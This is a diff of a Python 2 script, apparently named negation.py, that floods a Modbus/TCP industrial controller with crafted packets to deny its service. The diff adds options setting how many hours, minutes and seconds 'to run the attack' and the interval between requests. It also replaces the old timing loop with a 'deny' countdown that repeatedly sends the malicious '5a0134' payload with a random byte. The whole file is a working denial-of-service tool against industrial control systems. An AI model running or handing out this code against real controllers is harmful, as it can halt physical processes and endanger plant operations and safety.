@@ -1,9 +1,13 @@
 # -*- coding: utf-8 -*-
-import sys
 import time
 import socket
 import random 
 import argparse
+import subprocess as sp
+
+# Clear the screen for faux non scroll
+def cls():
+	tmp = sp.call('clear', shell = True)
 
 
 parser = argparse.ArgumentParser(prog='negation.py',
@@ -15,9 +19,12 @@ parser.add_argument('--sid',  dest="SlaveID", help='Slave ID (default 00)', defa
 parser.add_argument('--host', dest="HOST",    help='Host',required=True)
 parser.add_argument('--port', dest="PORT",    help='Port (default 502)',type=int,default=502)
 
-parser.add_argument('--hour', dest="HOUR",    help='Hours: 0 to 24 (default 0)', default="0", type=int)
-parser.add_argument('--min', dest="MIN",    help='Minutes: 0 to 60 (default 1)', default="1",type=int)
-parser.add_argument('--sec', dest="SEC",    help='Seconds: 0 to 60 (default 0)', default="0",type=int)
+parser.add_argument('--hrs', dest="HRS",    help='For how many *HOURS* do you want to run the attack?', default="0", type=int)
+parser.add_argument('--mins', dest="MINS",    help='For how many *MINUTES* do you want to run the attack?', default="1",type=int)
+parser.add_argument('--secs', dest="SECS",    help='For how many *SECONDS* do you want to run the attack?', default="0",type=int)
+
+# extra argument so we can choose the request frequency
+parser.add_argument('--interval', dest="INTERVAL",    help='How many seconds to wait between requests', default="4",type=int)
 
 args       	= 	parser.parse_args()
 
@@ -25,35 +32,25 @@ HST   		= 	args.HOST
 SID 		= 	str(args.SlaveID) ### ---> 00 to ff !!!!
 portModbus 	= 	args.PORT
 
-stopHour  	= 	str(args.HOUR).zfill(2)
-stopMin 	= 	str(args.MIN).zfill(2)
-stopSec		= 	str(args.SEC).zfill(2)
+# Convert hours & mins to seconds... keep seconds as seconds
+_hours = (args.HRS * 60) * 60
+_mins  = args.MINS * 60
+_secs  = args.SECS
 
-if (args.HOUR) >= 0 and (args.HOUR) <= 24:
-	pass
-else:
-	print "\n [!] Error: \t\targument --hour" 
-	print " [*] Invalid choice: \t"+stopHour
-	print " [>] Choose:\t\tMin 0. max 24 \n"
-	sys.exit(0)
+# Add all seconds to get total denial time
+_total_seconds = _hours + _mins + _secs
 
+# ok... parse the interval argument here:
+_interval = args.INTERVAL
 
-if (args.MIN) >= 0 and (args.MIN) <= 60:
-	pass
-else:
-	print "\n [!] Error: \t\targument --min" 
-	print " [*] Invalid choice: \t"+stopMin
-	print " [>] Choose:\t\tMin 0. max 60 \n"
-	sys.exit(0)
+if _total_seconds == 0:
+	print("At least one (pointless?) second must be specified.")
+	exit()
 
+if _interval == 0:
+	print("The interval is too short! Must be 1 or more.")
+	exit()
 
-if (args.SEC) >= 0 and (args.SEC) <= 60:
-	pass
-else:
-	print "\n [!] Error: \t\targument --sec" 
-	print " [*] Invalid choice: \t"+stopSec
-	print " [>] Choose:\t\tMin 0. Max 60\n"
-	sys.exit(0)
 
 class Colors:
     BLUE 		= '\033[94m'
@@ -73,7 +70,10 @@ def create_header_modbus(length,unit_id):
 
     return trans_id + proto_id + protoLen + unit_id.zfill(2)
 
-def busyService(pduInjection, tm):
+def busyService(pduInjection):
+
+	_result = ""
+
 	reqst = {}
 	lenPdu = str((len(pduInjection)/2)+1) 
 	
@@ -93,47 +93,55 @@ def busyService(pduInjection, tm):
 		print e		
 
 	mb_stopConection = MB_Request.decode('hex')
-	print Colors.GREEN+" [+] Send: \t\t"+Colors.BLUE+reqst[0]+Colors.ORANGE+reqst[1]+Colors.DEFAULT
+	_result += Colors.GREEN+" [+] Sent: \t\t"+Colors.BLUE+reqst[0]+Colors.ORANGE+reqst[1]+Colors.DEFAULT+"\n"
 	client.send(mb_stopConection) 
 	
 	try:
 		# tendremos respuesta ?
 		modResponse = (client.recv(1024))	
-		print " [+] Response: \t\t"+modResponse.encode("hex")
-		print " [+] Response(dec): \t"+modResponse+"\n"
+		_result += " [+] Response: \t\t" + modResponse.encode("hex") + "\n"
+		_result += " [+] Response(dec): \t"+modResponse+"\n"
+		return _result
+
 	except Exception, e:
-	 	print " [!] No Response: \t"+Colors.RED+str(e)+Colors.DEFAULT
+
+	 	return " [!] No Response: \t"+Colors.RED+str(e)+Colors.DEFAULT+"\n"
 	
 	client.close()
 
-def runTime(h, m, s):
-	stopTime = h +" : "+m+" : "+s
+def get_remaining_hms(total_seconds):
 
-	print " [+] Time stop (aprox):\t[ " + str(stopTime)+" ]\n"
-	for h in range(0,25):
-		for m in range(0,61):
-			for s in range(0,61):
+	# beautifully simple time conversion.
+	m, s = divmod(total_seconds, 60)
+	h, m = divmod(m, 60)
+	hms = "%d:%02d:%02d" % (h, m, s)
+	return hms
 
-				horX = str(h).zfill(2) 
-				minX = str(m).zfill(2)
-				segX = str(s).zfill(2)
 
-				actualTime =  horX+" : "+minX+" : "+segX
-				time.sleep(1)
+def deny(total_seconds, interval):
+	
+	result = ""
 
-				#print fullTime
-				if stopTime == actualTime:
-					print " [+] STOP:\t[ "+actualTime+" ]"
-					sys.exit(0)
+	while total_seconds != 0:
 
-				# ------------------------------------------------------- #
-				# Durante el tiempo definido ejecutamos funcion: 
-				# opt: cada 2 segundos?)
-				# ------------------------------------------------------- #
+		cls()
 
-				if s % 4 == 0:
-					secuenceRnd = (hex(random.randrange(00,255))[2:]).zfill(2)
-					badInjection = "5a01340001"+str(secuenceRnd)+"00"
-					busyService(badInjection, actualTime)
+		remaining_time = get_remaining_hms(total_seconds)
 
-runTime(stopHour, stopMin, stopSec) 
+		print " [+] Denial Time Remaining (approx):\t[ " + str(remaining_time)+" ]\n"
+		print "\n"
+		print result
+
+
+		time.sleep(1)
+
+		total_seconds -= 1
+
+		# Check to see if remaining time and interval mod to 0, if so, send request!
+		if total_seconds % interval == 0:
+			secuenceRnd = (hex(random.randrange(00,255))[2:]).zfill(2)
+			badInjection = "5a01340001"+str(secuenceRnd)+"00"
+			result += busyService(badInjection)
+		
+
+deny(_total_seconds, _interval)
